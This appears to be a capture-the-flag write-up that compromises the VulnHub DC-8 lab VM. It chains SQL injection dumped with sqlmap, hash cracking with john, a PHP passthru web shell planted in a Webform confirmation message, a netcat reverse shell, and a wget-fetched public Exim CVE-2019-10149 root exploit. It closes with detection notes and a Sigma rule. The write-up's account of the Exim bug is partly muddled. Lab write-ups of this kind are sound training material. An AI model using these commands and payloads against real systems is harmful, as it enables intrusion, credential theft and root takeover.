---
title: "VulnHub DC-8: Drupal SQLi to Cracked Hash to Root via a Local Exim Privilege Escalation"
attack: [T1595.001, T1190, T1110.002, T1078, T1059.004, T1068]
tools: [arp-scan, nmap, sqlmap, hashid, john, gobuster, searchsploit]
---

# VulnHub DC-8: Drupal SQLi to Cracked Hash to Root via a Local Exim Privilege Escalation

## Objective

Full compromise of VulnHub's "DC: 8" boot2root VM, on an isolated VirtualBox host-only network
against my own Kali attack box. One flag, root required.

## What I did

1. Host discovery and a full scan:
   ```
   arp-scan -l
   nmap -A dc8
   ```
   Two ports: 22/tcp (OpenSSH 7.4p1) and 80/tcp (Apache, Drupal 7). Added `192.168.56.120 dc8` to
   `/etc/hosts`.

2. The homepage is a Drupal 7 site with an "important message" banner mentioning ongoing
   maintenance. Links use a `?nid=` query parameter to render individual nodes — `?nid=1` rendered
   the same content cleanly, but `?nid='` (a single quote) returned a raw MySQL syntax error,
   immediately confirming an unsanitised, unauthenticated SQL injection on the `nid` parameter.

3. Automated the injection with sqlmap:
   ```
   sqlmap -u "http://dc8/?nid=" --dbs --batch
   ```
   Confirmed boolean-based, error-based and time-based blind injection techniques, backend MySQL
   (MariaDB fork), two databases: `d7db` and `information_schema`.

4. Enumerated the Drupal database's table list (standard Drupal 7 schema — `users`, `node`,
   `sessions`, etc.) and dumped the `users` table:
   ```
   sqlmap -u "http://dc8/?nid=" --dbs -D d7db --tables --batch
   sqlmap -u "http://dc8/?nid=" --dbs -D d7db -T users --dump --batch
   ```
   Recovered two accounts, `admin` and `john`, each with a Drupal 7 (`$S$`-prefixed) password
   hash.

5. Identified the hash format and cracked it:
   ```
   hashid hash.txt          # confirmed Drupal > v7.x
   john hash.txt -w /usr/share/wordlists/rockyou.txt --format=drupal7
   john --show hash.txt
   ```
   John cracked `john`'s hash in seconds using its built-in Drupal7 format support.

6. Logged into the Drupal site as `john` with the recovered password. With no immediately
   obvious admin-only RCE module enabled, ran directory/file enumeration in parallel:
   ```
   gobuster dir --url http://dc8 -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt
   ```
   Nothing beyond the standard Drupal paths turned up — the path to RCE was through the
   authenticated session itself, not a hidden endpoint.

7. As `john`, found a **Contact Us** node built with the core **Webform** module, and — critically
   — `john`'s account had **content-editing permissions** on it (not just submission rights).
   Opening the node's own **Webform → Form settings** tab exposes a "Confirmation message" field
   that is rendered using a configurable **text format** — and that format list includes **PHP
   code**, the same core PHP Filter mechanism abused on DC-7.

8. Switched the confirmation message's text format to **PHP code** and replaced the message body
   with a `passthru($_GET['cmd'])` payload, then saved the form settings.

9. Submitting the webform (`/node/3`) renders the confirmation message — and therefore executes
   the embedded PHP — on `/node/3/done`. Requesting
   `/node/3/done?sid=1&cmd=id` returned command output directly in the page body, confirming RCE.

10. Escalated to a reverse shell by passing a netcat-reverse-shell one-liner as `cmd` in the same
    URL, caught with `nc -nvlp 4321`. Landed as `www-data`.

11. Enumeration as `www-data`: `find / -perm -u=s -type f 2>/dev/null` turned up nothing obviously
    exploitable beyond standard SUID binaries. Stabilised the shell (`sudo -i` on my own Kali box
    for `rlwrap`, `export TERM=xterm-256color`) and checked what was installed for local mail
    delivery — Exim was present and reachable locally. `searchsploit exim` confirmed the version
    in use is vulnerable to a well-known local privilege-escalation chain, CVE-2019-10149 ("Return
    of the WIZard"), which needs no `sudo` rule at all: it abuses a bug in Exim's own delivery-
    address parsing, and Exim's mail-delivery binaries run with elevated privileges by design.

12. Fetched and ran the public PoC:
    ```
    searchsploit -m 46996.sh
    python -m http.server 8096      # on Kali
    wget http://192.168.56.102:8096/46996.sh    # on dc8, from /tmp (www-data can't write elsewhere)
    chmod +x 46996.sh
    ./46996.sh -m netcat
    ```
    The exploit abuses Exim 4.87–4.91's handling of a crafted `BDAT`/delivery command sequence
    (via `raptor_exim_wiz`) to run arbitrary commands as root, delivered here through a locally
    queued mail message triggering a netcat payload back to a listener on my Kali box.

13. Caught the privileged callback: `id` returned `uid=0(root) gid=113(Debian-exim)
    groups=113(Debian-exim)` — effectively root (UID 0) for all practical purposes, running under
    the Exim group context.

14. Confirmed root: `cd /root && cat flag.txt` — the box's own congratulations banner ("Brilliant
    - you have succeeded!!!"), no `flag{}`-style token to capture.

## What I found

- An unauthenticated SQL injection on Drupal 7's `nid` query parameter, recoverable all the way to
  credential-table dumps with no authentication at all.
- A Drupal 7 password hash crackable in seconds with a standard wordlist — the SQLi only needed to
  get the hash, a weak user password did the rest.
- A low-privilege authenticated user (`john`) had edit rights on a Webform node, which combined
  with Drupal's PHP Filter text format gives authenticated RCE through form **confirmation
  messages** specifically — a less obvious variant of the same PHP-Filter weakness as DC-7, this
  time reached via Webform settings rather than a node body.
- Exim was running a version vulnerable to a well-documented, actively-exploited local-root chain
  (CVE-2019-10149), giving root with a single public script once a local shell existed — no `sudo`
  misconfiguration was needed, since Exim's own delivery binaries run privileged by design.

## How I found it

**Recon and SQL injection**

![ARP scan of the host-only network](images/dc8/01.png)
![/etc/hosts entry for dc8](images/dc8/02.png)
![nmap -A against dc8 — SSH and Apache/Drupal 7](images/dc8/03.png)
![DC-8 homepage — "very important message" banner](images/dc8/04.png)
![?nid=1 rendering cleanly as a baseline](images/dc8/05.png)
![?nid=' returning a raw MySQL syntax error — SQLi confirmed](images/dc8/06.png)
![sqlmap confirming the injection and enumerating databases](images/dc8/07.png)
![sqlmap --dbs output — d7db and information_schema](images/dc8/08.png)
![sqlmap enumerating the d7db schema's tables](images/dc8/09.png)
![sqlmap dumping the users table — admin and john, Drupal7-format hashes](images/dc8/10.png)

**Credential cracking and authenticated RCE**

![user row data, including the Drupal7 password hash for john](images/dc8/11.png)
![hashid confirming the Drupal > v7.x hash format](images/dc8/12.png)
![john cracking the hash against rockyou.txt in seconds](images/dc8/13.png)
![gobuster directory enumeration — no additional hidden paths](images/dc8/14.png)
![logged into Drupal as john](images/dc8/15.png)
![Contact Us webform node, viewable/editable by john](images/dc8/16.png)
![Webform form-components tab — Name/Email/Details fields](images/dc8/17.png)
![Form settings — confirmation message field, Filtered HTML by default](images/dc8/18.png)
![confirmation message saved after switching to the PHP code text format](images/dc8/19.png)
![form settings updated, PHP payload now stored as the confirmation message](images/dc8/20.png)

**RCE to reverse shell, privilege escalation, root**

![RCE confirmed — id executed via the rendered confirmation message](images/dc8/21.png)
![browser address bar showing the reverse-shell cmd payload about to be requested](images/dc8/22.png)
![shell caught as www-data, enumerating SUID binaries](images/dc8/23.png)
![sudo -i and searchsploit exim — CVE-2019-10149 candidates listed](images/dc8/24.png)
![searchsploit -m fetching the Exim 4.87-4.91 local privesc PoC](images/dc8/25.png)
![Python HTTP server on Kali, serving the exploit](images/dc8/26.png)
![wget pulling and chmod +x'ing the exploit on dc8](images/dc8/27.png)
![running the exploit with the netcat delivery mode — root-equivalent shell obtained](images/dc8/28.png)
![root shell confirmed, flag file read](images/dc8/29.png)

## Detection

- **Unauthenticated SQLi on `nid`:** a single quote or SQL-keyword payload in a query parameter
  that normally only ever holds an integer node ID is unambiguous; a WAF rule restricting `nid` to
  `^[0-9]+$` would block this entire chain at the first step.
- **Credential cracking:** not visible in target-side logs — this is an attacker-side offline
  step. The only real control is password strength policy, not detection.
- **Webform confirmation-message RCE:** this is a quieter variant of the DC-7 PHP-Filter pattern —
  a non-admin user's webform settings being changed to use the **PHP code** text format is the
  detectable event; Drupal's `watchdog` log records form configuration changes, and a
  file-integrity/config baseline on which text formats are permitted per role would catch the
  misconfiguration (a low-privilege editor role should never have PHP Filter available to it at
  all).
- **Reverse shell spawn:** `www-data` spawning a shell process — the same process-tree signature
  seen throughout this series.
- **Exim local privilege escalation (CVE-2019-10149):** Exim versions before 4.92 processing a
  locally-queued message with a malformed/crafted address in a way that triggers command
  execution as root is a well-documented IOC; the exploit's netcat-delivery mode specifically
  shows up as the `exim`/`exim4` binary itself spawning a shell or network connection, which is
  never legitimate Exim behaviour.

A minimal Sigma rule for the Exim privilege escalation:

```yaml
title: Exim Spawning a Shell or Network Connection
status: experimental
description: Detects the Exim mail transfer agent spawning an interactive shell or outbound
    network connection, consistent with CVE-2019-10149 (the "Return of the WIZard" local
    privilege escalation).
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        ParentImage|endswith:
            - '/exim'
            - '/exim4'
        Image|endswith:
            - '/sh'
            - '/bash'
            - '/nc'
            - '/ncat'
    condition: selection
falsepositives:
    - None expected — Exim should never spawn a shell in normal mail delivery
level: critical
```

## Tools used

arp-scan, nmap, sqlmap, hashid, john the ripper, gobuster, searchsploit, a netcat reverse shell,
the public Exim 4.87–4.91 local privilege-escalation exploit (`raptor_exim_wiz`, EDB-46996).
